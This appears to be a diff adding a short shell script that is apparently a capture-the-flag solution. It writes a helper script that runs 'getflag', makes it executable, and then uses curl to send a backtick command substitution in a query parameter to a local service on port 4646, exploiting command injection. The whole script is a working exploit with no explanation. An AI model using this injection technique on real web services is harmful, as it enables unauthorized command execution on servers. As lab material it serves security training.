@@ -1,0 +1,5 @@
+echo "getflag > /tmp/pass" > /tmp/POO
+
+chmod +x /tmp/POO
+
+curl 'localhost:4646/?x=`/*/POO`'
